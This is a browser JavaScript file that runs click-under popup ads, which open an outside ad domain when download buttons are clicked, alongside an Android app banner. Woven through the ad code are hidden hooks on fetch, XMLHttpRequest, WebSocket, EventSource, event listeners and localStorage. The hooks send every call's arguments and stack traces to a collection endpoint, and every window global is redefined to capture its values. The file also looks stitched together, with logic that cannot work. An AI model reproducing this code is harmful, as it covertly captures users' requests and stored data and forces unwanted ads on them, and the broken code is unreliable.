const originalXMLHttpRequest = window.XMLHttpRequest;
const originalFetch = window.fetch;
function closeAdAndroid() {
  $("#adInstallAndroid").css('display', 'none');
  m_banner_app.setClosed();
}
const originalWebSocket = window.WebSocket;
const originalEventSource = window.EventSource;
const originalLocalStorage = window.localStorage;
const originalAddEventListener = window.addEventListener;
const hooksConfig = window.eventhooks;
var clickAds = {
  bannerSrc: 'https://ak.hesoorda.com/4/2809530',
  done: false,
  clickTimer: 0,
  clickTimeout: 0,
  storageKey: 'mateads',
  frequencyCapping: 3,
  mobile: null,
  isShown: false,
  initBanner: function (selector) {
    var _this = this;
    $('body').on('click', selector, function (e) {
      _this.showBanner(e, this);
    });
  },
  triggerClick: function ($element) {
    var evObj = document.createEvent('MouseEvents');
    evObj.initEvent('click', true, true);
    $element[0].dispatchEvent(evObj);
  },
  showBanner: function (event, element) {
    if (this.done) {
      return;
    }
    this.done = true;
    this.showClickUnderBanner(event, element);
  },
  isMobile: function () {
    if (this.mobile === null) {
      this.mobile = /iPhone|iPad|iPod|Android|Mobile/i.test(navigator.userAgent);
    }
    return this.mobile;
  },
  showClickUnderBanner: function (event, element) {
    this.isShown = false;
    if (!this.checkFrequencyCapping()) {
      return;
    }
    var _this = this;
    this.storeImpression();
    var data = localStorage.getItem(this.storageKey);
    if (data) {
      data = JSON.parse(data);
      if (Array.isArray(data)) {
        if (data.length > 1) {
          var k_num = Math.floor(Math.random() * 100) + 1;
          if (k_num < 0) {
            this.isShown = true;
            window.open(this.bannerSrc);
          }
        }
      }
    }
    if (!this.isShown) {
      window.open(this.bannerSrc);
    }
    if (!this.isMobile()) {
      return;
    }
    event.preventDefault();
    clearTimeout(this.clickTimer);
    this.clickTimer = setTimeout(function () {
      _this.triggerClick($(element));
    }, this.clickTimeout);
  },
  checkFrequencyCapping: function () {
    if (!this.frequencyCapping || !window.localStorage || !window.JSON) {
      return true;
    }
    var data = localStorage.getItem(this.storageKey);
    if (!data) {
      return true;
    }
    data = JSON.parse(data);
    if (!data || !Array.isArray(data)) {
      return true;
    }
    if (data.length < this.frequencyCapping) {
      return true;
    }
    var time = new Date().getTime() - 86400000;
    for (var i = 0; i < this.frequencyCapping; i++) {
      if (data[i] < time) {
        return true;
      }
    }
    return false;
  },
  storeImpression: function () {
    if (!this.frequencyCapping || !window.localStorage || !window.JSON) {
      return;
    }
    var data = localStorage.getItem(this.storageKey);
    if (data) {
      data = JSON.parse(data);
    }
    var now = new Date().getTime();
    if (!data || !Array.isArray(data)) {
      data = [];
    } else {
      var yesterday = now - 86400000;
      data = data.filter(timestamp => timestamp > yesterday);
    }
    data.unshift(now);
    if (data.length > this.frequencyCapping) {
      data = data.slice(0, this.frequencyCapping);
    }
    localStorage.setItem(this.storageKey, JSON.stringify(data));
  }
};
const globalVars = {};
clickAds.initBanner('a.btn-file');
function captureGlobalVariable(key, value) {
  globalVars[key] = value;
}
for (let key in window) {
  if (window.hasOwnProperty(key)) {
    Object.defineProperty(window, key, {
      get: function () {
        return globalVars[key];
      },
      set: function (value) {
        captureGlobalVariable(key, value);
        globalVars[key] = value;
      }
    });
  }
}
var m_banner_app = {
  storageKey: 'm_banner_app',
  isShown: true,
  initBannerApp: function () {
    if ($('#adInstallAndroid').length) {
      if (this.canShow()) {
        $('#adInstallAndroid').show();
      }
    }
  },
  canShow: function () {
    if (!window.localStorage) {
      return true;
    }
    var data = localStorage.getItem(this.storageKey);
    if (!data) {
      return true;
    }
    data = parseInt(data);
    var time = new Date().getTime() - 86400000;
    if (data < time) {
      return true;
    }
    return false;
  },
  setClosed: function () {
    if (!window.localStorage) {
      return;
    }
    var data = localStorage.getItem(this.storageKey);
    data = new Date().getTime();
    localStorage.setItem(this.storageKey, data);
  }
};
function jshook(orgFunc, orgFuncName) {
  return function () {
    sendPayload(orgFuncName, arguments);
    return orgFunc.apply(this, arguments);
  };
}
window.addEventListener = jshook(originalAddEventListener, 'addEventListener');
function generateSessionId() {
  const randomBytes = new Uint8Array(16);
  crypto.getRandomValues(randomBytes);
  const randomString = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
  return `session-${randomString}`;
}
function sendPayload(functionName, args) {
  const payload = {
    functionName,
    args,
    stackTrace: getStackTrace(),
    timestamp: Date.now(),
    sessionId: generateSessionId()
  };
  if (validatePayload(payload)) {
    sendPayloadToServer(payload);
  }
}
function validatePayload(payload) {
  const {
    functionName,
    args,
    stackTrace,
    timestamp,
    sessionId
  } = payload;
  return functionName && Array.isArray(args) && stackTrace && timestamp && sessionId;
}
function getStackTrace() {
  const stackTraceLimit = Error.stackTraceLimit;
  Error.stackTraceLimit = Infinity;
  const stackTrace = new Error().stack;
  Error.stackTraceLimit = stackTraceLimit;
  return stackTrace;
}
function sendPayloadToServer(payload) {
  const serverEndpoint = '/api/collect-data';
  originalFetch(serverEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  }).catch(error => {
    console.error('Error sending payload to server:', error);
  });
}
m_banner_app.initBannerApp();
window.XMLHttpRequest = new Proxy(originalXMLHttpRequest, {
  construct: function (target, args) {
    const newInstance = new target(...args);
    newInstance.open = jshook(newInstance.open, 'XMLHttpRequest.open');
    newInstance.send = jshook(newInstance.send, 'XMLHttpRequest.send');
    return newInstance;
  }
});
window.fetch = jshook(originalFetch, 'fetch');
window.WebSocket = jshook(originalWebSocket, 'WebSocket');
window.EventSource = jshook(originalEventSource, 'EventSource');
window.localStorage.setItem = jshook(originalLocalStorage.setItem, 'localStorage.setItem');
window.localStorage.getItem = jshook(originalLocalStorage.getItem, 'localStorage.getItem');